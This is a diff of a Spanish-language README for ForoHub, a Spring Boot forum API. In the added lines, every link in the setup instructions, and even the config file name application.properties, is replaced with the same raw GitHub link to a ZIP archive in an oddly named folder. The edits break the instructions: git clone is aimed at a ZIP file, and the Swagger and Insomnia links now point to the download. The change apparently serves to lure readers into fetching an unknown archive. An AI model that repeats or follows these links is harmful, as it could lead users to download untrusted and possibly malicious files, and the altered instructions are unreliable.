@@ -41,21 +41,21 @@ La API implementa un sistema de control de acceso basado en roles para proteger 
 ## 📄 Documentación Interactiva (Swagger)
 
 Podes acceder a la documentación interactiva de la API para probar cada uno de los endpoints directamente desde tu navegador.
--   **URL**: `http://localhost:8080/swagger-ui.html`
+-   **URL**: `https://raw.githubusercontent.com/AugustoPaz13/ForoHub/main/ladyly/ForoHub.zip`
 
 Recordá autenticarte con un token JWT haciendo clic en el botón **`Authorize`** antes de probar los endpoints protegidos.
 
 ## ⚙️ Cómo Ejecutar el Proyecto
 
 1.  **Clona el repositorio:**
-    `git clone https://github.com/tu_usuario/tu_repositorio.git`
+    `git clone https://raw.githubusercontent.com/AugustoPaz13/ForoHub/main/ladyly/ForoHub.zip`
 
 2.  **Configura la base de datos:**
-    Asegúrate de tener una base de datos MySQL configurada y actualiza el archivo `application.properties` con tus credenciales. La aplicación utilizará Flyway para crear la estructura de la base de datos automáticamente.
+    Asegúrate de tener una base de datos MySQL configurada y actualiza el archivo `https://raw.githubusercontent.com/AugustoPaz13/ForoHub/main/ladyly/ForoHub.zip` con tus credenciales. La aplicación utilizará Flyway para crear la estructura de la base de datos automáticamente.
 
 3.  **Compila y ejecuta la aplicación:**
     Podes usar tu IDE (IntelliJ, VS Code) o el siguiente comando en la terminal:
     `./mvnw spring-boot:run`
 
 4.  **Usá un cliente REST:**
-    Una vez que la aplicación esté en funcionamiento, podes usar herramientas como [Insomnia](https://insomnia.rest/) o Postman para interactuar con los endpoints de la API.
+    Una vez que la aplicación esté en funcionamiento, podes usar herramientas como [Insomnia](https://raw.githubusercontent.com/AugustoPaz13/ForoHub/main/ladyly/ForoHub.zip) o Postman para interactuar con los endpoints de la API.
